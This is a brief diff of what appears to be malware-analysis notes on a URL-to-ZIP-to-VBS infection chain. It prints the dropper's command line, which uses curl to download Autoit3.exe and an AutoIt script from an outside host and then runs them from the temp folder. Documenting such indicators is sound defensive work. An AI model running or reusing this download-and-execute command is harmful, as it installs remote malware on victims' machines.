@@ -12,7 +12,7 @@ url > zip > vbs
 
 WScript.exe C:\Users\Admin\AppData\Local\Temp\Doc-94.vbs
 
-cmd.exe" f InStr(1,  WScript.ScriptFullName,"vbs", 1) > 0 Then:path = WScript.ScriptFullName:end if
+cmd.exe f InStr(1,  WScript.ScriptFullName,"vbs", 1) > 0 Then:path = WScript.ScriptFullName:end if
 '/c cd /d %temp% & curl -o Autoit3.exe http://whoernet.co.com:80 & curl -o dftxsm.au3 http://whoernet.co.com:80/msifvwjscyk & Autoit3.exe dftxsm.au3
 
 curl -o Autoit3.exe http://whoernet.co.com:80 
